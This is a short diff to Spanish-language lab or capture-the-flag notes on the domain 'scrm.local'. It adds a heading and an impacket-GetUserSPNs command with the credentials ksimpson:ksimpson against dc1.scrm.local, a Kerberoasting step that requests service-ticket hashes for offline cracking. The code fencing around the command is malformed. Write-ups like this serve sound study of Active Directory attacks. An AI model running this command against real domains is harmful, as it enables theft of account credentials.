@@ -171,6 +171,8 @@ podemos conseguir en internet como resolver el problema de la autenticación de 
 `editamos el escript`
 ![[Pasted image 20240401212242.png]]
 
-### 
+### impacket-GetUserSPNs 
+```python
 
+```impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
 ![[Pasted image 20240401213827.png]]
